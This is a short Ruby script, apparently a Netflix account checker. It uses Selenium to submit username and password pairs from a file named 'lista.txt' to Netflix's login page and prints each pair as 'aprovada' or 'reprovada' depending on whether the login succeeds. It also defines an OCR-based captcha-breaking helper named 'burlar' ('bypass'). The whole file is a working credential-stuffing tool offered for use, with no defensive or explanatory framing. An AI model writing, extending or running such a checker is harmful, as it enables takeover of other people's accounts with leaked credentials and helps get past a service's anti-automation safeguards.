require('rtesseract')
require('selenium-webdriver')
class Checker
  def burlar(imagem)
  captcha = RTesseract.new(imagem)
  return captcha.to_s
  end
  def login(users,passwd)

    driver = Selenium::WebDriver.for :chrome
    driver.navigate.to "https://netflix.com/login"
    #puts driver.page_source
    user = driver.find_element(name: "userLoginId")
    user.send_keys(users)
    pass = driver.find_element(name: "password")
    pass.send_keys(passwd)
    pass.submit
    if driver.page_source.include? "icon-search" then
      puts "aprovada #{users}:#{passwd}"
    else
      puts "reprovada #{users}:#{passwd}"
    end
  end


      

    
  end


c = Checker.new
File.foreach("lista.txt"){|conta| c.login(conta.split("|")[0],conta.split("|")[1]) }


